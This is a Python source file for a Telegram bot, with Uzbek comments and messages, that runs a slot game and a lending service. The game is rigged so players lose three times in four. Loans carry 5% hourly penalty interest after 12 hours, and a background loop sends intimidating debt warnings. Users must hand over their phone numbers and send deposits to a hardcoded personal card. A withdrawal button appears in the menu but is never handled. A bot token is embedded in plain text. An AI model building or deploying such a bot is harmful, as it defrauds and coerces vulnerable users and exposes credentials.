import telebot
from telebot import types
import re
import time
import threading
import random
from datetime import datetime, timedelta
import os

# --- 1. ASOSIY SOZLAMALAR ---
TOKEN = '8609558089:AAExgvs1_XR5jlj9RGC55zZStvc7nV_Z6hE' #
ADMIN_ID = 8299021738  #
ADMIN_KARTA = "9860 6067 5582 9722" #
bot = telebot.TeleBot(TOKEN)

# Ma'lumotlar bazasi (Vaqtinchalik xotira)
users = {}

def get_user(uid):
    if uid not in users:
        users[uid] = {
            'reg': False, 
            'name': '', 
            'phone': '', 
            'balance': 0, 
            'loan': 0, 
            'loan_time': None, 
            'last_scare': None
        }
    return users[uid]

# --- 2. QARZ VA PENYA HISOB-KITOBI ---
def calculate_loan(uid):
    user = get_user(uid)
    penya = 0
    if user['loan'] > 0 and user['loan_time']:
        passed = datetime.now() - user['loan_time']
        hours = int(passed.total_seconds() // 3600)
        if hours > 12:
            # 12 soatdan keyin har soat uchun 5% penya
            penya = int(user['loan'] * 0.05 * (hours - 12))
    total_to_pay = user['loan'] + penya
    return user['loan'], penya, total_to_pay

# --- 3. AVTOMATIK OGOHLANTIRISH TIZIMI ---
def scare_system():
    while True:
        now = datetime.now()
        for uid, u in users.items():
            if u['loan'] > 0 and u['loan_time']:
                if (now - u['loan_time']) > timedelta(hours=12):
                    if not u['last_scare'] or (now - u['last_scare']) > timedelta(hours=2):
                        try:
                            bot.send_message(uid, "‼️ DIQQAT! QARZ MUDDATI O'TDI!\n\nPenya hisoblanmoqda. Iltimos, qarzni to'lang!")
                            u['last_scare'] = now
                        except:
                            pass
        time.sleep(60)

threading.Thread(target=scare_system, daemon=True).start()

# --- 4. ASOSIY MENYU ---
def main_menu():
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.row("🎰 777 O'yini", "💰 Balans")
    markup.row("💳 Depozit qilish", "💸 Qarz olish")
    markup.row("🏦 Qarzni to'lash", "ℹ️ Ma'lumot")
    markup.row("📤 Pul yechish")
    return markup

# --- 5. RO'YXATDAN O'TISH (FAQAT TUGMA ORQALI RAQAM OLISH) ---
@bot.message_handler(commands=['start'])
def start_cmd(message):
    user = get_user(message.chat.id)
    if not user['reg']:
        msg = bot.send_message(message.chat.id, "👋 Xush kelibsiz! Ro'yxatdan o'tish uchun Ism va Familiyangizni kiriting:")
        bot.register_next_step_handler(msg, reg_name)
    else:
        bot.send_message(message.chat.id, "Asosiy menyu:", reply_markup=main_menu())

def reg_name(message):
    get_user(message.chat.id)['name'] = message.text
    # Foydalanuvchi raqamini qo'lda yozolmaydi, faqat tugma orqali
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    button = types.KeyboardButton(text="📱 Telefon raqamni yuborish", request_contact=True)
    markup.add(button)
    msg = bot.send_message(message.chat.id, f"Rahmat, {message.text}!\n\nEndi pastdagi tugmani bosib, raqamingizni tasdiqlang:", reply_markup=markup)
    bot.register_next_step_handler(msg, reg_phone)

def reg_phone(message):
    user = get_user(message.chat.id)
    if message.contact: # Faqat tugma bosilsa ishlaydi
        user['phone'] = message.contact.phone_number
        user['reg'] = True
        bot.send_message(message.chat.id, "✅ Muvaffaqiyatli ro'yxatdan o'tdingiz!", reply_markup=main_menu())
        bot.send_message(ADMIN_ID, f"🆕 YANGI AZO:\n👤 {user['name']}\n📞 {user['phone']}\n🆔 {message.chat.id}")
    else:
        # Agar raqamni o'zi yozishga harakat qilsa
        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
        button = types.KeyboardButton(text="📱 Telefon raqamni yuborish", request_contact=True)
        markup.add(button)
        msg = bot.send_message(message.chat.id, "⚠️ Xato! Faqat pastdagi tugmani bosing:", reply_markup=markup)
        bot.register_next_step_handler(msg, reg_phone)

# --- 6. O'YIN TIZIMI (25% YUTUQ VA 10K-130K LIMIT) ---
@bot.message_handler(func=lambda m: m.text == "🎰 777 O'yini")
def game_777(message):
    user = get_user(message.chat.id)
    bet = 50000 
    if user['balance'] < bet:
        return bot.send_message(message.chat.id, f"⚠️ Balans yetarli emas (Tikish: {bet:,} UZS).")
    
    user['balance'] -= bet
    bot.send_message(message.chat.id, "🎰 O'yin ketmoqda...")
    bot.send_dice(message.chat.id, emoji='🎰')
    time.sleep(4)
    
    # 3 ta yutqaziq : 1 ta yutuq
    is_winner = random.choice([False, False, False, True])
    
    if is_winner:
        win_amt = random.randint(10000, 130000) # Siz aytgan yutuq limitlari
        user['balance'] += win_amt
        bot.send_message(message.chat.id, f"🎉 TABRIKLAYMIZ!\n✅ Yutuq: +{win_amt:,} UZS\n💵 Balans: {user['balance']:,} UZS")
    else:
        bot.send_message(message.chat.id, f"😟 Yutqazdingiz.\n❌ -{bet:,} UZS\n💵 Balans: {user['balance']:,} UZS")

# --- 7. QARZ OLISH ---
@bot.message_handler(func=lambda m: m.text == "💸 Qarz olish")
def loan_init(message):
    user = get_user(message.chat.id)
    if user['loan'] > 0:
        return bot.send_message(message.chat.id, "❌ To'lanmagan qarzingiz bor!")
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Tasdiqlayman", callback_data="l_yes"),
               types.InlineKeyboardButton("❌ Bekor qilish", callback_data="l_no"))
    bot.send_message(message.chat.id, "⚠️ QARZ SHARTLARI:\n• 12 soat foizsiz\n• Keyin har soat +5% penya\n\nRozimisiz?", reply_markup=markup)

@bot.callback_query_handler(func=lambda c: c.data.startswith('l_'))
def loan_callback(call):
    if call.data == "l_yes":
        msg = bot.send_message(call.message.chat.id, "💰 Miqdorni yozing (100k - 2mln):")
        bot.register_next_step_handler(msg, loan_finish)
    else:
        bot.edit_message_text("Bekor qilindi.", call.message.chat.id, call.message.message_id)

def loan_finish(message):
    try:
        amt = int(re.sub(r'\D', '', message.text))
        if 100000 <= amt <= 2000000:
            user = get_user(message.chat.id)
            user['loan'] = amt
            user['balance'] += amt
            user['loan_time'] = datetime.now()
            bot.send_message(message.chat.id, f"✅ {amt:,} UZS berildi.")
            bot.send_message(ADMIN_ID, f"💸 QARZ OLINDI: {user['name']} - {amt:,} UZS")
        else:
            bot.send_message(message.chat.id, "❌ Limit: 100,000 - 2,000,000 UZS")
    except:
        bot.send_message(message.chat.id, "⚠️ Faqat raqam yozing.")

# --- 8. DEPOZIT VA QARZ TO'LASH ---
@bot.message_handler(func=lambda m: m.text in ["💳 Depozit qilish", "🏦 Qarzni to'lash"])
def payment_start(message):
    mode = "DEP" if "Depozit" in message.text else "PAY"
    msg = bot.send_message(message.chat.id, f"💳 Karta: {ADMIN_KARTA}\n\nTo'lovdan so'ng summani yuboring:")
    bot.register_next_step_handler(msg, lambda m: payment_req(m, mode))

def payment_req(message, mode):
    try:
        amt = int(re.sub(r'\D', '', message.text))
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("✅ TASTIQLASH", callback_data=f"adm_ok_{mode}_{message.chat.id}_{amt}"),
                   types.InlineKeyboardButton("❌ RAD ETISH", callback_data=f"adm_no_{mode}_{message.chat.id}"))
        bot.send_message(ADMIN_ID, f"🔔 TO'LOV ({mode}): {amt:,} UZS\nID: {message.chat.id}", reply_markup=markup)
        bot.send_message(message.chat.id, "⌛️ Admin tasdiqlashi kutilmoqda...")
    except:
        bot.send_message(message.chat.id, "⚠️ Summani raqamda yozing.")

# --- 9. ADMIN CALLBACK ---
@bot.callback_query_handler(func=lambda c: c.data.startswith('adm_'))
def admin_callback(call):
    data = call.data.split('_')
    status, mode, uid, amt = data[1], data[2], int(data[3]), int(data[4] if len(data) > 4 else 0)
    user = get_user(uid)
    if status == 'ok':
        if mode == 'DEP': user['balance'] += amt
        elif mode == 'PAY': user['loan'] = 0; user['loan_time'] = None
        bot.send_message(uid, "✅ To'lovingiz tasdiqlandi!")
    else:
        bot.send_message(uid, "❌ To'lov rad etildi.")
    bot.edit_message_text(f"Bajarildi: {status}", call.message.chat.id, call.message.message_id)

# --- 10. MA'LUMOTLAR ---
@bot.message_handler(func=lambda m: m.text == "💰 Balans")
def show_balance(message):
    l, p, total = calculate_loan(message.chat.id)
    user = get_user(message.chat.id)
    bot.send_message(message.chat.id, f"💵 BALANS: {user['balance']:,} UZS\n💸 QARZ: {total:,} UZS")

@bot.message_handler(func=lambda m: m.text == "ℹ️ Ma'lumot")
def info_view(message):
    user = get_user(message.chat.id)
    bot.send_message(message.chat.id, f"👤 {user['name']}\n📞 {user['phone']}\n💰 {user['balance']:,} UZS")

bot.polling(none_stop=True)
